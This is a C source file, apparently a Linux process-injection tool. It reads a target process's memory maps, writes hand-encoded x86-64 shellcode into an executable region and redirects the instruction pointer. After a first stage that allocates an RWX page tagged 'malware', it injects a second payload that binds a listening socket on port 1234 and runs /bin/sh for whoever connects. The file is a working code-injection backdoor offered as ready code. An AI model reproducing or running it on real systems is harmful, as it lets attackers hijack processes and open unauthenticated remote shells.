#include "def.h"

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int
main(int argc, char *argv[])
{
	if (argc < 2) {
		printf("need pid\n");
		exit(EXIT_FAILURE);
	}

	pid_t pid;
	pid = atoi(argv[1]);

	printf("pid: %i\n", pid);

	int res;

	struct mm_list mm_list;
	res = mm_list_new(&mm_list);
	if (res < 0) {
		printf("failed to initialize the mm list, res: %i\n", res);
		exit(EXIT_FAILURE);
	}

	res = mm_list_get(&mm_list, pid);
	if (res < 0) {
		printf("failed to get the mm list, res: %i\n", res);
		exit(EXIT_FAILURE);
	}

	struct mm_entry *mm_entry;
	for (size_t i = 0; i < mm_list.len; ++i) {
		mm_entry = &mm_list.vec[i];
		if (mm_entry->prot & (1 << MM_PROT_EXEC))
			break;
	}

	struct user_regs_struct regs_bkp;
	res = vm_regs_get(pid, &regs_bkp);
	if (res < 0) {
		printf("failed to get the registers, res: %i\n", res);
		exit(EXIT_FAILURE);
	}

	static const char shl_mem[] = {
		0x90,
		0x90,
		0x48, 0xb8, 0x09, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x48, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x48, 0xbe, 0x00, 0x10, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x48, 0xba, 0x07, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x49, 0xba, 0x22, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x49, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 
		0x49, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x0f, 0x05, 
		0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
		0x74, 0x1b, 
		0xc6, 0x00, 0x6d,
		0xc6, 0x40, 0x01, 0x61, 
		0xc6, 0x40, 0x02, 0x6c, 
		0xc6, 0x40, 0x03, 0x77, 
		0xc6, 0x40, 0x04, 0x61, 
		0xc6, 0x40, 0x05, 0x72, 
		0xc6, 0x40, 0x06, 0x65,
		0xe9, 0xfb, 0xff, 0xff, 0xff
	};

	char shl_bkp[sizeof (shl_mem)];
	bzero(shl_bkp, sizeof (shl_bkp));

	void *shl_bkp_addr;
	shl_bkp_addr = mm_entry->start;

	char shl_bkp_prot;
	shl_bkp_prot = mm_entry->prot;

	res = vm_read(pid, sizeof (shl_bkp), shl_bkp, mm_entry->start, mm_entry->prot);
	if (res < 0) {
		printf("failed to read the remote page, res: %i\n", res);
		exit(EXIT_FAILURE);
	}

	res = vm_write(pid, sizeof (shl_mem), shl_mem, mm_entry->start, mm_entry->prot);
	if (res < 0) {
		printf("failed to write the shell code at %p, prot: %02x, res: %i\n", 
			mm_entry->start, mm_entry->prot, res);
		exit(EXIT_FAILURE);
	}

	struct user_regs_struct regs;
	memcpy(&regs, &regs_bkp, sizeof (regs));

	static const char inst_syscall[] = { 0x0F, 0x05 }; 

	regs.rip = (unsigned long long int)mm_entry->start + sizeof (inst_syscall);
	res = vm_regs_set(pid, &regs);
	if (res < 0) {
		printf("failed to change the instruction pointer, res: %i\n", res);
		exit(EXIT_FAILURE);
	}

	int found;
	found = 0;
	while (!found) {
		mm_list.len = 0;
		res = mm_list_get(&mm_list, pid);
		if (res < 0) {
			printf("failed to get the mm list, res: %i\n", res);
			exit(EXIT_FAILURE);
		}

		for (size_t i = 0; i < mm_list.len; ++i) {
			mm_entry = &mm_list.vec[i];
			if (mm_entry->prot & (1 << MM_PROT_EXEC)) {
				static const char sig_str[] = "malware";
				
				char sig_buf[sizeof (sig_str) - 1];
				bzero(sig_buf, sizeof (sig_buf));
				res = vm_read(pid, sizeof (sig_buf), sig_buf, mm_entry->start, mm_entry->prot);
				if (res < 0) {
					printf("failed to read the remote page, res: %i\n", res);
					exit(EXIT_FAILURE);
				}

				if (memcmp(sig_buf, sig_str, sizeof (sig_buf)) == 0) {
					found = 1;
					break;
				}
			}
		}

		sleep(1);
	}

	res = vm_write(pid, sizeof (shl_bkp), shl_bkp, shl_bkp_addr, shl_bkp_prot);
	if (res < 0) {
		printf("failed to write the mem shell backup at %p, prot: %02x, res: %i\n", 
			shl_bkp_addr, shl_bkp_prot, res);
		exit(EXIT_FAILURE);
	}

	static const char shl_srv[] = {
		0x90,
		0x90,
		0x55,
		0x48, 0x89, 0xe5,
		0x48, 0x81, 0xec, 0x48, 0x00, 0x00, 0x00,
		0x48, 0xb8, 0x29, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x48, 0xbf, 0x02, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x48, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x0f, 0x05, 
		0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
		0x0f, 0x84, 0x5e, 0x02, 0x00, 0x00, 
		0x89, 0x45, 0xb8,
		0xc7, 0x45, 0xb4, 0x01, 0x00, 0x00, 0x00,
		0x48, 0xb8, 0x36, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x8b, 0x7d, 0xb8,
		0x48, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x48, 0xba, 0x02, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x4c, 0x8d, 0x55, 0xb4, 
		0x49, 0xb8, 0x04, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x0f, 0x05, 
		0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
		0x0f, 0x84, 0x17, 0x02, 0x00, 0x00, 
		0xc7, 0x45, 0xb4, 0x01, 0x00, 0x00, 0x00,
		0x48, 0xb8, 0x36, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x8b, 0x7d, 0xb8,
		0x48, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x48, 0xba, 0x0f, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x4c, 0x8d, 0x55, 0xb4, 
		0x49, 0xb8, 0x04, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x0f, 0x05, 
		0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
		0x0f, 0x84, 0xd3, 0x01, 0x00, 0x00, 
		0x48, 0xc7, 0x45, 0xa4, 0x00, 0x00, 0x00,
		0x00, 
		0x48, 0xc7, 0x45, 0xac, 0x00, 0x00, 0x00,
		0x00, 
		0x66, 0xc7, 0x45, 0xa4, 0x02, 0x00, 
		0xc7, 0x45, 0xa8, 0x00, 0x00, 0x00, 0x00,
		0x66, 0xc7, 0x45, 0xa6, 0x04, 0xd2, 
		0x48, 0xb8, 0x31, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x8b, 0x7d, 0xb8,
		0x48, 0x8d, 0x75, 0xa4, 
		0x48, 0xba, 0x10, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x0f, 0x05, 
		0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
		0x0f, 0x84, 0x87, 0x01, 0x00, 0x00, 
		0x48, 0xb8, 0x32, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x8b, 0x7d, 0xb8,
		0x48, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x0f, 0x05, 
		0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
		0x0f, 0x84, 0x62, 0x01, 0x00, 0x00, 
		0x48, 0xb8, 0x2b, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x8b, 0x7d, 0xb8,
		0x48, 0x8d, 0x75, 0x94, 
		0x48, 0x8d, 0x55, 0x90, 
		0x0f, 0x05, 
		0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
		0x0f, 0x84, 0x3f, 0x01, 0x00, 0x00, 
		0x89, 0x45, 0x8c,
		0x48, 0xb8, 0x3a, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x0f, 0x05, 
		0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
		0x0f, 0x84, 0x24, 0x01, 0x00, 0x00, 
		0x89, 0x45, 0x88,
		0x81, 0x7d, 0x88, 0x00, 0x00, 0x00, 0x00,
		0x0f, 0x84, 0xe0, 0x00, 0x00, 0x00, 
		0x48, 0xb8, 0x21, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x8b, 0x7d, 0x8c,
		0x48, 0xbe, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x0f, 0x05, 
		0x48, 0xb8, 0x21, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x8b, 0x7d, 0x8c,
		0x48, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x0f, 0x05, 
		0x48, 0xb8, 0x21, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x8b, 0x7d, 0x8c,
		0x48, 0xbe, 0x02, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x0f, 0x05, 
		0xc6, 0x85, 0x74, 0xff, 0xff, 0xff, 0x2f,
		0xc6, 0x85, 0x75, 0xff, 0xff, 0xff, 0x75,
		0xc6, 0x85, 0x76, 0xff, 0xff, 0xff, 0x73,
		0xc6, 0x85, 0x77, 0xff, 0xff, 0xff, 0x72,
		0xc6, 0x85, 0x78, 0xff, 0xff, 0xff, 0x2f,
		0xc6, 0x85, 0x79, 0xff, 0xff, 0xff, 0x62,
		0xc6, 0x85, 0x7a, 0xff, 0xff, 0xff, 0x69,
		0xc6, 0x85, 0x7b, 0xff, 0xff, 0xff, 0x6e,
		0xc6, 0x85, 0x7c, 0xff, 0xff, 0xff, 0x2f,
		0xc6, 0x85, 0x7d, 0xff, 0xff, 0xff, 0x73,
		0xc6, 0x85, 0x7e, 0xff, 0xff, 0xff, 0x68,
		0xc6, 0x85, 0x7f, 0xff, 0xff, 0xff, 0x00,
		0x48, 0xc7, 0x45, 0x80, 0x00, 0x00, 0x00,
		0x00, 
		0x48, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x48, 0x8d, 0xbd, 0x74, 0xff, 0xff, 0xff,
		0x48, 0x8d, 0x75, 0x80, 
		0x48, 0x8d, 0x55, 0x80, 
		0x0f, 0x05, 
		0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
		0x74, 0x4a, 
		0x48, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x48, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x0f, 0x05, 
		
		0x48, 0xb8, 0x3d, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x48, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x0f, 0x05, 
		0x48, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x8b, 0x7d, 0x8c,
		0x0f, 0x05, 
		0x48, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 
		0x8b, 0x7d, 0xb8,
		0x0f, 0x05, 
		
		0xc9,
		0xc3,
	};

	res = vm_write(pid, sizeof (shl_srv), shl_srv, mm_entry->start, mm_entry->prot);
	if (res < 0) {
		printf("failed to write the shell code at %p, prot: %02x, res: %i\n", 
			mm_entry->start, mm_entry->prot, res);
		exit(EXIT_FAILURE);
	}

	res = vm_regs_get(pid, &regs);
	if (res < 0) {
		printf("failed to get the instruction pointer, res: %i\n", res);
		exit(EXIT_FAILURE);
	}

	regs.rip = (unsigned long long int)mm_entry->start + sizeof (inst_syscall);
	res = vm_regs_set(pid, &regs);
	if (res < 0) {
		printf("failed to change the instruction pointer, res: %i\n", res);
		exit(EXIT_FAILURE);
	}

	mm_list_del(&mm_list);
	return EXIT_SUCCESS;
}
